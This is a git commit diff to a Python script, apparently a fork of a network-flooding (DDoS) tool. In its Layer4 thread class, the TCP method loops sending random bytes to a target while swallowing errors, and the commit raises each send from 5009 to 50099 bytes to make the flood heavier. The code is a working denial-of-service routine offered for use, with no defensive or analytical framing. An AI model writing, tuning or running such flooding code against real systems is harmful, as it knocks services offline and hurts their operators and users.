1dd401cfcf7316a67ef1bc8a47d2ae7c2c6abce3
Revamp-MTT <132065512+Revamp-MTT@users.noreply.github.com>
2023-05-08 13:00:55 +0700

    Update Revamp13..py

--- Revamp13..py
+++ Revamp13..py
@@ -429,7 +429,7 @@ class Layer4(Thread):
     def TCP(self) -> None:
         s = None
         with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
-            while Tools.send(s, randbytes(5009),self._target):
+            while Tools.send(s, randbytes(50099),self._target):
                 continue
         Tools.safe_close(s)
 
